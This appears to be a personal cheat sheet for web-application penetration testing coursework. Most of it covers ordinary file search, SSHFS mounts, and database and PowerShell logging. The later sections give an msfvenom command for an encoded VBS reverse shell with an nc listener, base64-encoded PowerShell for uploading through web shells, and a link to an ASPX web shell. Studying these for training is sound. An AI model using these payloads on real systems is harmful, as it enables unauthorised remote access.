
Press `Ctrl+H` to show/hide hidden files in the file browser!

# Find files

Recursive, with file extension:

```bash
find . -print0 -type f -name '*.php'
```

Find and execute a command

```bash
find . -type f -name '.htaccess' -exec cat '{}' ';'
```

Recursive, with regex content match:

```bash
grep -rnw /var/www/html/ATutor -e "^.*user_location.*public.*" --color
```

## Copy files from remote server

Assuming we have SSHFS or a similar mount:

```bash
find . -print0 -type f -name '*.php' -exec cp --parents '{}' /home/kali/Desktop/awae/labs/atmail/app/ ';' 
```

## Remote edit files

```bash
gedit ftp://atutor/var/www/html/ATutor/search.php
```

## SSH File System

Mount a file system using SSHFS:

```bash
sshfs -oKexAlgorithms=+diffie-hellman-group1-sha1 atmail@192.168.137.106 /mnt/atmail
```

Unmount it again using:

```bash
fusermount -u /mnt/atmail
```

## Samba File Share

Start a file share server:
```
sudo impacket-smbserver awae /home/kali/awae
```

## Connect to...

MySQL

```bash
mysql servername -u root -p
```

## Enable logging...

Enable logging in `/etc/mysql/my.cnf`

```ini
general_log = 1
general_log_file = /var/log/mysql/mysql.log
```

Enable logging in `postgresql.conf`.  Restart the server (or process that embeds a PGSQL DB) for the change to take effect.

```ini
log_statement='all'
```

Logs should be going to the `pgsql_log` subfolder.

## Enable debug messages

PHP5

```ini
display_errors = On
```

## Encoding

Convert a file to/from hex:

```sh
xxd file.bin | cut -d " " -f 2-9 | sed 's/ //g' | tr -d '\n'
```

## Web Server

```bash
python -m SimpleHTTPServer 9090
```

## Postfix

Update SMTP transport configuration as needed

```bash
sudo nano /etc/postfix/transport
```
```/etc/postfix/transport
offsec.local smtp:[129.168.121.106]:587
```

```bash
sudo postmap transport
sudo systemctl restart postfix.service
```

## Powershell

Sort directory listings and take most recent

```ps
dir | sort LastWriteTime | Select -last 1
```

Tail a log file and filter output for a certain line pattern

```ps
Get-Content my.log -Wait -Tail 1 | Select-String -Pattern "error" -Context 0,2
```

View running processes

```ps
tasklist | findstr /i calc
```

Create base64 encoded payloads of PS1 scripts to upload via web shells or similar methods where special characters can cause issues:

```sh
iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
```
```ps1
powershell.exe -EncodedCommand $Base64Data
```


## VBS

Use `:` as a command separator to run multiple commands on one line.
Use `_` as a continuation character to split a single command over multiple lines.

Run scripts using `cscript.exe myscript.vbs`

## msfvenom

Create TCP reverse shell in VBS:

```
msfvenom -a x86 --platform windows -p windows/reverse_shell_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -f vbs
```
```
nc -lvp 4444
```

## Web Shells

_When serving web shells from our own server, make sure to set permissions so they aren't executable on our server, and thus that we don't web-shell ourselves!  E.g. `chmod 644`._

[cmdasp.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx)